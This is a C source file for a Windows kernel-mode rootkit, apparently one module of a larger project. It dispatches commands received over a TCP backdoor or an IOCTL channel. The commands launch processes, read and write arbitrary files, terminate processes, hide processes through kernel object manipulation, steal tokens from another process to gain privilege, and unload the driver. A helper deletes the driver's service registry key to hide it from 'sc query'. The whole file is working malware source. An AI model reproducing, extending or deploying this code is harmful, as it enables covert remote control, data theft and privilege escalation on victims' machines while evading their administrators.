/*==============================================================================
 * rootkit/src/commands.c
 *------------------------------------------------------------------------------
 * Command parser / dispatcher for both TCP backdoor and IOCTL control plane.
 *
 * PROCESS EXECUTION:
 *   Uses ZwCreateUserProcess (the kernel path CreateProcess uses internally).
 *   RtlCreateUserProcess is an older wrapper that builds
 *   RTL_USER_PROCESS_PARAMETERS itself; ZwCreateUserProcess gives us control
 *   over the attribute list and is preferred here.
 *============================================================================*/
#include "../utils.h"
#include <ntimage.h>
#include "../../inc/undoc.h"

/*==============================================================================
 * FORWARD DECLARATIONS
 *============================================================================*/
NTSTATUS elevate_current_to_pid(ULONG source_pid);
ULONG    enum_processes(RK_PROC_ENTRY* out, ULONG max_entries);
NTSTATUS hide_process(ULONG pid);
NTSTATUS unhide_process(ULONG pid);
PEPROCESS find_process_by_pid(ULONG pid);

/*==============================================================================
 * ZWCREATEUSERPROCESS DECLARATION
 *------------------------------------------------------------------------------
 * Not in public headers; declared here for kernel-mode use.
 *============================================================================*/
typedef struct _PS_ATTRIBUTE {
    ULONG_PTR Attribute;
    SIZE_T    Size;
    union { ULONG_PTR Value; PVOID ValuePtr; };
    PSIZE_T   ReturnLength;
} PS_ATTRIBUTE, *PPS_ATTRIBUTE;

typedef struct _PS_ATTRIBUTE_LIST {
    SIZE_T       TotalLength;
    PS_ATTRIBUTE Attributes[3];
} PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;

typedef struct _PS_CREATE_INFO {
    SIZE_T Size;
    ULONG  State;
    union {
        struct { PVOID InitFlags; PVOID FileHandle; } CreateAll;
    } u;
} PS_CREATE_INFO, *PPS_CREATE_INFO;

#define PS_ATTRIBUTE_IMAGE_NAME 0x20005
#define PS_ATTRIBUTE_CLIENT_ID   0x10003

extern NTSTATUS NTAPI ZwCreateUserProcess(
    PHANDLE ProcessHandle, PHANDLE ThreadHandle,
    ACCESS_MASK ProcessDesiredAccess, ACCESS_MASK ThreadDesiredAccess,
    POBJECT_ATTRIBUTES ProcessObjectAttributes,
    POBJECT_ATTRIBUTES ThreadObjectAttributes,
    ULONG ProcessFlags, ULONG ThreadFlags,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PPS_CREATE_INFO CreateInfo, PPS_ATTRIBUTE_LIST AttributeList);

/*==============================================================================
 * HELPER: EXECUTE PROCESS
 *------------------------------------------------------------------------------
 * Launches a process via ZwCreateUserProcess with minimal attributes.
 *============================================================================*/
static NTSTATUS exec_process(PUNICODE_STRING image_path) {
    PS_ATTRIBUTE_LIST attr = {0};
    attr.TotalLength = sizeof(attr);
    attr.Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
    attr.Attributes[0].Size      = image_path->Length;
    attr.Attributes[0].ValuePtr  = image_path->Buffer;

    PS_CREATE_INFO ci = {0};
    ci.Size = sizeof(ci);

    HANDLE ph = NULL, th = NULL;
    NTSTATUS s = ZwCreateUserProcess(
        &ph, &th,
        PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS,
        NULL, NULL, 0, 0, NULL, &ci, &attr);

    if (NT_SUCCESS(s)) {
        if (ph) ZwClose(ph);
        if (th) ZwClose(th);
    }
    return s;
}

/*==============================================================================
 * HELPER: READ FILE INTO BUFFER
 *------------------------------------------------------------------------------
 * Opens file, reads entire contents into allocated pool buffer.
 * Caller must free returned buffer with rk_free().
 *============================================================================*/
static NTSTATUS read_file_into(PUNICODE_STRING path, UCHAR** out, ULONG* out_len) {
    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, path, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

    HANDLE h = NULL;
    IO_STATUS_BLOCK iosb = {0};
    NTSTATUS s = ZwCreateFile(&h, GENERIC_READ | SYNCHRONIZE, &oa, &iosb, NULL,
                              FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN,
                              FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
                              NULL, 0);
    if (!NT_SUCCESS(s)) return s;

    FILE_STANDARD_INFORMATION fsi = {0};
    s = ZwQueryInformationFile(h, &iosb, &fsi, sizeof(fsi), FileStandardInformation);
    if (!NT_SUCCESS(s)) { ZwClose(h); return s; }

    ULONG len = (ULONG)fsi.EndOfFile.QuadPart;
    if (len == 0 || len > FILE_CHUNK_MAX) { ZwClose(h); return STATUS_INVALID_BUFFER_SIZE; }

    UCHAR* buf = (UCHAR*)rk_alloc(len, POOL_TAG);
    if (!buf) { ZwClose(h); return STATUS_INSUFFICIENT_RESOURCES; }

    LARGE_INTEGER off = {0};
    s = ZwReadFile(h, NULL, NULL, NULL, &iosb, buf, len, &off, NULL);
    ZwClose(h);

    if (!NT_SUCCESS(s)) { rk_free(buf, POOL_TAG); return s; }

    *out = buf;
    *out_len = (ULONG)iosb.Information;
    return STATUS_SUCCESS;
}

/*==============================================================================
 * HELPER: WRITE FILE FROM BUFFER
 *------------------------------------------------------------------------------
 * Opens file (creates/overwrites), writes data at specified offset.
 *============================================================================*/
static NTSTATUS write_file_from(PUNICODE_STRING path, ULONG offset, const UCHAR* data, ULONG len) {
    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, path, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

    HANDLE h = NULL;
    IO_STATUS_BLOCK iosb = {0};
    NTSTATUS s = ZwCreateFile(&h, GENERIC_WRITE | SYNCHRONIZE, &oa, &iosb, NULL,
                              FILE_ATTRIBUTE_NORMAL, 0, FILE_OVERWRITE_IF,
                              FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
                              NULL, 0);
    if (!NT_SUCCESS(s)) return s;

    LARGE_INTEGER off; off.QuadPart = offset;
    s = ZwWriteFile(h, NULL, NULL, NULL, &iosb, (PVOID)data, len, &off, NULL);
    ZwClose(h);
    return s;
}

/*==============================================================================
 * HELPER: KILL PROCESS
 *------------------------------------------------------------------------------
 * Opens process with TERMINATE access and calls ZwTerminateProcess.
 * Tries PsOpenProcess first (faster, kernel handle), falls back to ZwOpenProcess.
 *============================================================================*/
static NTSTATUS kill_process(ULONG pid) {
    PEPROCESS pe = find_process_by_pid(pid);
    if (!pe) return STATUS_NOT_FOUND;

    HANDLE h = NULL;
    NTSTATUS s = PsOpenProcess(PROCESS_TERMINATE, NULL, pe, &h);
    if (!NT_SUCCESS(s)) {
        CLIENT_ID cid = {0};
        cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
        OBJECT_ATTRIBUTES oa;
        InitializeObjectAttributes(&oa, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
        s = ZwOpenProcess(&h, PROCESS_TERMINATE, &oa, &cid);
        if (!NT_SUCCESS(s)) return s;
    }
    s = ZwTerminateProcess(h, STATUS_SUCCESS);
    ZwClose(h);
    return s;
}

/*==============================================================================
 * HELPER: DELETE SERVICE REGISTRY KEY
 *------------------------------------------------------------------------------
 * Removes our service key so `sc query` no longer reports the driver.
 * Best-effort; failure is non-fatal.
 *============================================================================*/
static NTSTATUS delete_service_key(const WCHAR* key_name) {
    UNICODE_STRING us;
    RtlInitUnicodeString(&us, key_name);
    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
    HANDLE h = NULL;
    NTSTATUS s = ZwOpenKey(&h, KEY_ALL_ACCESS, &oa);
    if (!NT_SUCCESS(s)) return s;
    s = ZwDeleteKey(h);
    ZwClose(h);
    return s;
}

/*==============================================================================
 * RESPONSE BUFFER MANAGEMENT
 *============================================================================*/
typedef struct _RESP_BUF {
    UCHAR* data;
    ULONG  len;
    ULONG  cap;
} RESP_BUF;

static NTSTATUS resp_append(RESP_BUF* r, const void* src, ULONG len) {
    if (r->len + len > r->cap) return STATUS_BUFFER_TOO_SMALL;
    RtlCopyMemory(r->data + r->len, src, len);
    r->len += len;
    return STATUS_SUCCESS;
}

/*==============================================================================
 * COMMAND DISPATCHER (Public API)
 *------------------------------------------------------------------------------
 * Processes a single framed command from either TCP or IOCTL path.
 *
 * Input format:  [u8 cmd][payload...]
 * Output format: [payload...] (length returned via out_len)
 *
 * Returns: STATUS_SUCCESS on success, error code on failure.
 *============================================================================*/
NTSTATUS dispatch_command(const UCHAR* in, ULONG in_len, UCHAR* out, ULONG out_cap, ULONG* out_len) {
    if (in_len < 1) return STATUS_INVALID_PARAMETER;

    UCHAR cmd = in[0];
    const UCHAR* payload = in + 1;
    ULONG payload_len = in_len - 1;

    RESP_BUF r = { out, 0, out_cap };

    switch (cmd) {

    /*--------------------------------------------------------------------------
     * CMD_PING (0x01) - Keepalive
     *   Payload: none
     *   Response: "pong"
     *-------------------------------------------------------------------------*/
    case CMD_PING:
        RK_TRY(resp_append(&r, "pong", 4));
        break;

    /*--------------------------------------------------------------------------
     * CMD_EXEC (0x02) - Execute Process
     *   Payload: UTF-16LE image path (no length prefix, null-terminated)
     *   Response: "exec=0xXXXXXXXX" (NTSTATUS hex)
     *-------------------------------------------------------------------------*/
    case CMD_EXEC: {
        UNICODE_STRING path;
        RK_TRY(rk_unicode_from_bytes(&path, payload, (USHORT)payload_len));
        NTSTATUS s = exec_process(&path);
        rk_unicode_free(&path);
        char msg[32];
        RtlStringCchPrintfA(msg, sizeof(msg), "exec=0x%08X", s);
        RK_TRY(resp_append(&r, msg, (ULONG)strlen(msg)));
        break;
    }

    /*--------------------------------------------------------------------------
     * CMD_PS (0x03) - List Processes
     *   Payload: none
     *   Response: Array of RK_PROC_ENTRY (binary)
     *-------------------------------------------------------------------------*/
    case CMD_PS: {
        ULONG max = 512;
        RK_PROC_ENTRY* list = (RK_PROC_ENTRY*)rk_alloc_zero(max * RK_PROC_ENTRY_SIZE, POOL_TAG);
        if (!list) return STATUS_INSUFFICIENT_RESOURCES;
        ULONG n = enum_processes(list, max);
        RK_TRY(resp_append(&r, list, n * RK_PROC_ENTRY_SIZE));
        rk_free(list, POOL_TAG);
        break;
    }

    /*--------------------------------------------------------------------------
     * CMD_READ (0x04) - Read File
     *   Payload: UTF-16LE path (null-terminated)
     *   Response: File bytes (binary) or "read=0xXXXXXXXX" on error
     *-------------------------------------------------------------------------*/
    case CMD_READ: {
        UNICODE_STRING path;
        RK_TRY(rk_unicode_from_bytes(&path, payload, (USHORT)payload_len));
        UCHAR* data = NULL; ULONG len = 0;
        NTSTATUS s = read_file_into(&path, &data, &len);
        rk_unicode_free(&path);
        if (!NT_SUCCESS(s)) {
            char msg[32]; RtlStringCchPrintfA(msg, sizeof(msg), "read=0x%08X", s);
            RK_TRY(resp_append(&r, msg, (ULONG)strlen(msg)));
        } else {
            RK_TRY(resp_append(&r, data, len));
            rk_free(data, POOL_TAG);
        }
        break;
    }

    /*--------------------------------------------------------------------------
     * CMD_WRITE (0x05) - Write File
     *   Payload: [u32 offset][UTF-16LE path (null-term)][data...]
     *   Response: "write=0xXXXXXXXX"
     *-------------------------------------------------------------------------*/
    case CMD_WRITE: {
        if (payload_len < 4) return STATUS_INVALID_PARAMETER;
        ULONG offset = *(ULONG*)payload;
        const UCHAR* rest = payload + 4;
        ULONG rest_len = payload_len - 4;

        /* Find null-terminated UTF-16LE path (2-byte NUL). */
        USHORT plen = 0;
        while (plen + 1 < rest_len && !(rest[plen] == 0 && rest[plen + 1] == 0)) plen += 2;
        plen += 2;  /* Include terminating NUL */
        if (plen >= rest_len) return STATUS_INVALID_PARAMETER;

        UNICODE_STRING path;
        RK_TRY(rk_unicode_from_bytes(&path, rest, plen));
        NTSTATUS s = write_file_from(&path, offset, rest + plen, rest_len - plen);
        rk_unicode_free(&path);
        char msg[32]; RtlStringCchPrintfA(msg, sizeof(msg), "write=0x%08X", s);
        RK_TRY(resp_append(&r, msg, (ULONG)strlen(msg)));
        break;
    }

    /*--------------------------------------------------------------------------
     * CMD_KILL (0x06) - Terminate Process
     *   Payload: u32 PID
     *   Response: "kill=0xXXXXXXXX"
     *-------------------------------------------------------------------------*/
    case CMD_KILL: {
        if (payload_len < 4) return STATUS_INVALID_PARAMETER;
        ULONG pid = *(ULONG*)payload;
        NTSTATUS s = kill_process(pid);
        char msg[32]; RtlStringCchPrintfA(msg, sizeof(msg), "kill=0x%08X", s);
        RK_TRY(resp_append(&r, msg, (ULONG)strlen(msg)));
        break;
    }

    /*--------------------------------------------------------------------------
     * CMD_HIDE (0x07) - Hide Process (DKOM)
     *   Payload: u32 PID
     *   Response: "hide=0xXXXXXXXX"
     *-------------------------------------------------------------------------*/
    case CMD_HIDE: {
        if (payload_len < 4) return STATUS_INVALID_PARAMETER;
        ULONG pid = *(ULONG*)payload;
        NTSTATUS s = hide_process(pid);
        char msg[32]; RtlStringCchPrintfA(msg, sizeof(msg), "hide=0x%08X", s);
        RK_TRY(resp_append(&r, msg, (ULONG)strlen(msg)));
        break;
    }

    /*--------------------------------------------------------------------------
     * CMD_UNHIDE (0x08) - Unhide Process
     *   Payload: u32 PID
     *   Response: "unhide=0xXXXXXXXX"
     *-------------------------------------------------------------------------*/
    case CMD_UNHIDE: {
        if (payload_len < 4) return STATUS_INVALID_PARAMETER;
        ULONG pid = *(ULONG*)payload;
        NTSTATUS s = unhide_process(pid);
        char msg[32]; RtlStringCchPrintfA(msg, sizeof(msg), "unhide=0x%08X", s);
        RK_TRY(resp_append(&r, msg, (ULONG)strlen(msg)));
        break;
    }

    /*--------------------------------------------------------------------------
     * CMD_ELEVATE (0x09) - Token Theft
     *   Payload: u32 source PID (token donor)
     *   Response: "elevate=0xXXXXXXXX"
     *-------------------------------------------------------------------------*/
    case CMD_ELEVATE: {
        if (payload_len < 4) return STATUS_INVALID_PARAMETER;
        ULONG pid = *(ULONG*)payload;
        NTSTATUS s = elevate_current_to_pid(pid);
        char msg[32]; RtlStringCchPrintfA(msg, sizeof(msg), "elevate=0x%08X", s);
        RK_TRY(resp_append(&r, msg, (ULONG)strlen(msg)));
        break;
    }

    /*--------------------------------------------------------------------------
     * CMD_UNLOAD (0x0A) - Request Driver Unload
     *   Payload: none
     *   Response: "unloading"
     *   Side effect: Signals listener thread to exit via g_unload_event.
     *-------------------------------------------------------------------------*/
    case CMD_UNLOAD: {
        RK_TRY(resp_append(&r, "unloading", 9));
        extern KEVENT g_unload_event;
        KeSetEvent(&g_unload_event, IO_NO_INCREMENT, FALSE);
        break;
    }

    /*--------------------------------------------------------------------------
     * UNKNOWN COMMAND
     *-------------------------------------------------------------------------*/
    default: {
        char msg[32]; RtlStringCchPrintfA(msg, sizeof(msg), "unknown=0x%02X", cmd);
        RK_TRY(resp_append(&r, msg, (ULONG)strlen(msg)));
        break;
    }
    }

    *out_len = r.len;
    return STATUS_SUCCESS;
}

/*==============================================================================
 * PUBLIC: DELETE ROOTKIT SERVICE KEY
 *============================================================================*/
NTSTATUS delete_rootkit_service_key(VOID) {
    return delete_service_key(L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\KdmpRt");
}